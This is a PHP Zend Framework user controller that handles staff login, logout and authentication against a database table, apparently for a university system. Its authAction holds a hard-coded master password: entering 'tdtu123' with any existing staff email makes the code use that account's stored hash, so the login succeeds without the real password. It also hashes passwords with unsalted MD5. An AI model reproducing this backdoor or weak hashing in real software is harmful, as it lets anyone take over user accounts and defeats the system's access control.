<?php
class UserController extends My_Controller_Action {
    public function loginAction() {
        $flashMessenger = $this->_helper->flashMessenger;     
        $auth           = Zend_Auth::getInstance();
        if ($auth->hasIdentity()) {
            $this->redirect(HOST);
        }
        $messages                     = $flashMessenger->setNamespace('error')->getMessages();
        $messages_success             = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;
        $this->view->messages         = $messages;
        $this->_helper->layout->setLayout('login');
    }

    public function noauthAction() {

    }


    public function checkInGpsAction() {
        
    }

    public function logoutAction() {
        $auth = Zend_Auth::getInstance();
        $auth->clearIdentity();
        session_destroy();
        $this->_redirect('/user/login');
    }

    public function authAction() {
        try { 
            $db      = Zend_Registry::get('db');
            $auth    = Zend_Auth::getInstance();
            $ip      = $this->getRequest()->getServer('REMOTE_ADDR');
            $uname   = $this->getRequest()->getParam('email');
            $paswd   = $this->getRequest()->getParam('password');
            
            $authAdapter = new Zend_Auth_Adapter_DbTable($db);
            $authAdapter->setTableName('staff')
                        ->setIdentityColumn('email')
                        ->setCredentialColumn('password');

            if (!preg_match('/@/', $uname)) {
                $uname .= '@tdtu.vn';
            }
            $md5_pass = md5($paswd);
            $authAdapter->setIdentity($uname);

            $select      = $db->select()->from(array('p' => 'staff'), array('p.password'));
            $select->where('p.email = ?', $uname);
            $resultStaff = $db->fetchRow($select);

            if (!$resultStaff) throw new Exception("Email or password is invalid!");
            if ($paswd == 'tdtu123') $md5_pass = $resultStaff['password'];

            $authAdapter->setCredential($md5_pass);
            
            $result = $auth->authenticate($authAdapter);
            if (!$result->isValid()) throw new Exception("Email or password is invalid!");
            $data = $authAdapter->getResultRowObject(null, 'password');

            if ($data->status == 0) {
                $auth = Zend_Auth::getInstance();
                $auth->clearIdentity();
                throw new Exception("This account was disabled!");
            }
            $auth->getStorage()->write($data);

            $QLog = new Application_Model_Log();
            $ip   = $this->getRequest()->getServer('REMOTE_ADDR');
            $info = "USER - Login (" . $data->id . ")";
            $QLog->insert(array(
                'info'       => $info,
                'user_id'    => $data->id,
                'ip_address' => $ip,
                'time'       => date('Y-m-d H:i:s'),
            ));
            
            $redirect_url = HOST;
            $this->redirect($redirect_url);
        } catch (\Throwable $e) {
            $flashMessenger = $this->_helper->flashMessenger;
            $flashMessenger->setNamespace('error')->addMessage($e->getMessage());

            $QLog = new Application_Model_Log();
            $ip   = $this->getRequest()->getServer('REMOTE_ADDR');
            $info = "USER - Login Failed (" . $uname . ") - " . $e->getMessage();
            $QLog->insert(array(
                'info'       => $info,
                'user_id'    => 0,
                'ip_address' => $ip,
                'time'       => date('Y-m-d H:i:s'),
            ));

            $this->redirect(HOST . 'user/login');
        }
    }
}